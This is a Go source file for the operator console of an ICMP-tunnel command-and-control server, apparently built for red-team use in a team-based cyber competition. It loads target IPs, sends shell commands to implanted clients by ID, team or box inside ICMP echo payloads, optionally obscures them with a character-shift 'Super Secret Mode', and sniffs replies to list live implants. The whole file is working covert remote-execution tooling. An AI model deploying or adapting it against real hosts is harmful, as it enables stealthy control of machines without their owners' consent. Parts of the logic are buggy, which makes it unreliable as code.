package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var clients = make(map[int]string)
var ALIVE = make(map[string]bool)
var PacketQueue []icmp.Message
var SSM bool = false
var execute = false
var ID int = 0
var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
var EncryptValue = 3
var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)
var NumOfTeams int

func print_title() {
	fmt.Println(".__                          ___             .__.__    ___")
	fmt.Println("|__| ____  __ ________      /  /   _______  _|__|  |   \\  \\")
	fmt.Println("|  _/ ___\\|  |  \\____ \\    /  /  _/ __ \\  \\/ |  |  |    \\  \\")
	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
	fmt.Println("We are so back.")
}

func print_help() {
	fmt.Println("\tadd <IP ADDRESS>               Adds new client by IP")
	fmt.Println("\tls                             Show all added clients")
	fmt.Println("\trm <ID>                        Removes a client by ID")
	fmt.Println("\tremoveallclients               Removes all clients")
	fmt.Println("\tsend <ID> <message>            Send message to client at ID")
	fmt.Println("\texe <ID> <command>             Send command to client at ID")
	fmt.Println("\tsendtoall <message>            Sends <message> to all clients")
	fmt.Println("\texeonall <command>             Execute <command> on all clients")
	fmt.Println("\tsendtoteam <team> <command>    Send <command> to all <team> clients")
	fmt.Println("\texeonteam <team> <command>     Execute <command> on all <team> clients")
	fmt.Println("\tsendtobox <ip> <message>       Send <message> on all teams at 1.1.x.1 box")
	fmt.Println("\texeonbox <1.1.x.1> <command>   Execute <command> on all teams at 1.1.x.1 box")
	fmt.Println("\tload                           Loads all clients specified in targets.txt")
	fmt.Println("\tcheckalive                     Generates a board of replying clients")
	// [FIX] fmt.Println("\tshell <ID>                     Creates a direct line with client at ID")
	fmt.Println("\tkill                           Stops server")
	fmt.Println("\tssm                            Toggles Super Secret Mode")
	// fmt.Println("\tdebug                          Toggles Debug")
	fmt.Println("\thelp                           Prints this")
}

func AddClient(ip string) {
	clients[ID] = ip
	ID++
}

func RemoveClient(id int) {
	_, ok := clients[id]
	if !ok {
		fmt.Println("Invalid ID")
	}
	delete(clients, id)
}

func RemoveAllClients() {
	for k := range clients {
		RemoveClient(k)
	}
}

func ShowClients() {
	keys := SortMap()
	for _, k := range keys {
		ClientString := "ID: " + strconv.Itoa(k) + ", IP: " + clients[k]
		fmt.Println(ClientString)
	}
}

func SortMap() []int {
	keys := make([]int, 0, len(clients))
	for k := range clients {
		keys = append(keys, k)
	}
	sort.Ints(keys)
	return (keys)
}

func LoadClients() {
	readFile, err := os.Open("targets.txt")
	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	FirstLine := true
	for fileScanner.Scan() {
		if FirstLine == true {
			NumOfTeams, _ = strconv.Atoi(fileScanner.Text())
			fmt.Println("Number of Teams:", NumOfTeams)
			FirstLine = false
		} else {
			AddClient(fileScanner.Text())
		}
	}
}

func SendToTeam(team int, message string) {
	if NumOfTeams == 0 {
		fmt.Println("[ERROR] No teams loaded.")
	}
	if team > NumOfTeams || team < NumOfTeams {
		fmt.Println("[ERROR] Invalid team.")
	}
	teamnum := 1
	i := 0
	fmt.Println("Team:", teamnum)
	for clientindex := 0; clientindex < len(clients); clientindex++ {
		fmt.Println("ID:", clientindex)
		if teamnum == team {
			Send(message, clientindex)
		}
		if i == len(clients)/NumOfTeams-1 {
			teamnum++
			i = 0
			continue
		}
		i++
	}
}

func SendToAll(message string) {
	for id := range clients {
		Send(message, id)
	}
}

func SendToBox(ip string, command string) {
	var Valid bool
	var XIndex int
	DestOctets := strings.Split(ip, ".")
	for X, TestOctet := range DestOctets {
		if TestOctet == "x" || TestOctet == "X" {
			XIndex = X
		}
	}
	for ClientID, ClientIP := range clients {
		Valid = true
		ClientOctets := strings.Split(ClientIP, ".")
		for ClientIndex, ClientOctet := range ClientOctets {
			if ClientIndex == XIndex {
				continue
			} else {
				if ClientOctet != DestOctets[ClientIndex] {
					Valid = false
				} else {
					continue
				}
			}
		}
		if Valid {
			Send(command, ClientID)
		} else {
			continue
		}
	}
}

func GenerateHeader(segment int, segmented bool, ip string) string {
	SegmentNum := strconv.Itoa(segment)
	header := "!!!"
	// ### is server flag
	// Value 1 (SSM) is Encryption option
	// Value 2 is execution option
	// Value 3 is segment for oversized packets
	// Value 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += SegmentNum
	header += "[" + ip + "]" // Append IP to header for NAT
	return header
}

func MakePacket(payload string) {
	if SSM {
		payload = payload[0:8] + encrypt(payload[8:])
	}
	packet := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   0,
			Seq:  0,
			Data: []byte(payload),
		},
	}
	PacketQueue = append(PacketQueue, packet)
}

func SendPackets(addr string, c icmp.PacketConn) {
	for _, packet := range PacketQueue {
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}
}

func Send(message string, id int) {
	if len(message) > 1460 {
		segment := 0
		for len(message) > 1460 {
			payload := GenerateHeader(segment, true, clients[id]) + message[0:1460]
			MakePacket(payload)
			SendPackets(clients[id], *c)
			fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
			message = message[1460:]
			segment++
		}
		payload := GenerateHeader(segment, true, clients[id]) + message[0:]
		MakePacket(payload)
	} else {
		payload := GenerateHeader(0, false, clients[id]) + message
		MakePacket(payload)
		SendPackets(clients[id], *c)
	}
	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
	PacketQueue = nil
}

func CheckTwoStrings(words []string) bool {
	if len(words) == 1 {
		fmt.Println("Usage: add <IP Address>")
		return false
	}
	words = strings.Split(words[1], " ")
	if len(words) != 1 {
		fmt.Println("Usage: add <IP Address>")
		return false
	}
	return true
}

func ParseID(args []string) (string, int) {
	ParsedArgs := strings.SplitN(args[1], " ", 2)
	id, _ := strconv.Atoi(ParsedArgs[0])
	return ParsedArgs[1], id
}

func encrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) + 3))
	}
	return encrypted
}

func decrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) - 3))
	}
	return encrypted
}

func convert(values []byte) string {
	var converted string
	converted = bytes.NewBuffer(values).String()
	return converted
}

func sniffer() {
	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := convert(packet.ApplicationLayer().Payload())
		if strings.HasPrefix(payload, "###") {
			parts := strings.SplitN(payload, "[", 2)

			// get the part before "["
			header := parts[0]

			// get the part after "["
			AfterHeader := parts[1]

			// split the string by "]"
			parts = strings.Split(AfterHeader, "]")

			// get the part before "]"
			ip := parts[0]

			fmt.Println("Header:", header)
			fmt.Println("IP:", ip)
			fmt.Println("Response:", parts[1])
			if parts[1] == "pong" {
				ALIVE[ip] = true
			}
		} else {
			continue
		}
	}
}

func CheckAlive() {
	if NumOfTeams == 0 {
		fmt.Println("No Clients Loaded.")
		return
	}
	keys := SortMap()
	i := 0
	teamnumber := 1
	fmt.Printf("Team%3d: ", teamnumber)
	for id := range keys {
		if ALIVE[clients[id]] == true {
			fmt.Printf("\033[92m[%2d]\033[0m", id)
		} else {
			fmt.Printf("\033[91m[%2d]\033[0m", id)
		}
		if i == len(clients)/NumOfTeams-1 {
			fmt.Println()
			i = 0
			teamnumber++
			if teamnumber != NumOfTeams+1 {
				fmt.Printf("Team%3d: ", teamnumber)
			}
			continue
		}
		i++
	}
}

func main() {
	if ListenerError != nil {
		fmt.Println(ListenerError)
	}
	print_title()
	fmt.Println("Type \"help\" for list of commands.")
	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		input, err := consoleReader.ReadString('\n')
		input = strings.TrimRight(input, "\r\n")
		if err != nil {
			fmt.Println(err)
		}
		tokens := strings.SplitN(input, " ", 2)

		switch tokens[0] {
		case "add":
			if CheckTwoStrings(tokens) {
				AddClient(tokens[1])
			}
		case "rm":
			if CheckTwoStrings(tokens) {
				id, err := strconv.Atoi(tokens[1])
				if err != nil {
					fmt.Println("Not an ID.")
					continue
				}
				RemoveClient(id)
			}
		case "removeallclients":
			RemoveAllClients()
		case "ls":
			ShowClients()
		case "load":
			LoadClients()
			SortMap()
		case "send":
			execute = false
			message, id := ParseID(tokens)
			Send(message, id)
		case "sendtobox":
			execute = false
			FixMe := strings.Split(tokens[1], " ")
			SendToBox(FixMe[0], FixMe[1])
		case "sendtoteam":
			execute = false
			message, team := ParseID(tokens)
			SendToTeam(team, message)
		case "sendtoall":
			execute = false
			SendToAll(tokens[1])
		case "exe":
			execute = true
			message, id := ParseID(tokens)
			Send(message, id)
		case "exeonbox":
			execute = true
			FixMe := strings.Split(tokens[1], " ")
			SendToBox(FixMe[0], FixMe[1])
		case "exeonteam":
			execute = false
			message, team := ParseID(tokens)
			SendToTeam(team, message)
		case "exeonall":
			execute = true
			SendToAll(tokens[1])
		case "ssm":
			if SSM {
				SSM = false
				fmt.Println("[DEBUG] Super Secret Mode disabled.")
			} else {
				SSM = true
				fmt.Println("[DEBUG] Super Secret Mode enabled.")
			}
		case "checkalive":
			for _, ip := range clients {
				ALIVE[ip] = false
			}
			SendToAll("ping")
			time.Sleep(5000 * time.Millisecond)
			CheckAlive()
		case "kill":
			print_title()
			os.Exit(0)
		default:
			fmt.Println("Invalid command: [", input, "]")
		}
	}
}
